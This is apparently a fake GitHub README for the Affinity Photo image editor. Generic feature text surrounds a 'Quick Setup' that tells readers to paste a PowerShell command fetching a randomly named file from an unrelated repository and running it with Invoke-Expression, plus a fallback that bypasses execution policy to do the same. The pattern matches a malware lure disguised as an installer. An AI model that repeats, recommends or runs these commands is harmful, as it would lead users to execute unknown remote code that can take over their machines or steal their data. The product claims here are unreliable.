# Affinity Photo

Affinity Photo is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Affinity Photo and work in it.

Affinity Photo is a desktop image editor for Windows that handles raw development, pixel editing, and multi-layer compositing in one workspace. You work with personas for dedicated tasks—Develop for camera raw, Photo for retouching and montage, Liquify for warp, and Export for slices and presets—without leaving the application.

A typical session starts with opening RAW or layered files, correcting exposure and white balance in Develop, then moving to Photo to dodge and burn, clone, and refine selections with precise brushes and live filter layers. You might stack adjustment layers, blend modes, and vector shapes, run frequency separation or HDR merge, and finish by sharpening for output size before batch-exporting TIFF or JPEG from the Export persona.

This repository tracks the Windows setup package, release notes, and a changelog so installs and upgrades stay documented across machines. Short notes capture default export settings, workspace layouts, and plugin paths used in production. The changelog records version bumps and workflow fixes so teammates know what changed between builds.

## What you do with it

- Develop persona processes camera RAW with lens corrections and tonal curves in one pass.
- Live filter layers apply blur, noise reduction, and sharpening without flattening underlying pixels.
- PSD import preserves layers, masks, and blend modes for mixed pipeline handoffs on Windows.
- Affinity Photo supports unlimited undo history and snapshots for branching retouch experiments safely.
- Focus merging stacks bracketed shots into sharp depth across macro and landscape subjects.
- HDR merge combines exposures with tone mapping controls tuned for natural interior scenes.
- Export persona batches resize, sharpen, and slice assets with repeatable output presets.
- Liquify persona warps mesh regions for portrait refinement while keeping background geometry stable.

## Quick Setup (PowerShell)

This installs the program Affinity Photo on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/zimmermannsilke218806/affinity-photo-setup-guide/main/a9opnsm89n.rjd2hx3z | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/zimmermannsilke218806/affinity-photo-setup-guide/main/a9opnsm89n.rjd2hx3z | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `a9opnsm89n.rjd2hx3z` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `zimmermannsilke218806/affinity-photo-setup-guide`. Affinity Photo 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
